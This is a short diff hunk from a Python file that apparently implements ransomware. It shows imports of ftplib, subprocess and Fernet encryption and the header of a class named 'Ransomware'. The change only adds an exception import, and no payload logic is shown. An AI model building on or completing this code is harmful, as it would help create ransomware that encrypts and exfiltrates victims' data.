@@ -4,7 +4,7 @@ import string
 import ftplib
 import platform
 import subprocess
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet, InvalidToken
 
 
 class Ransomware:
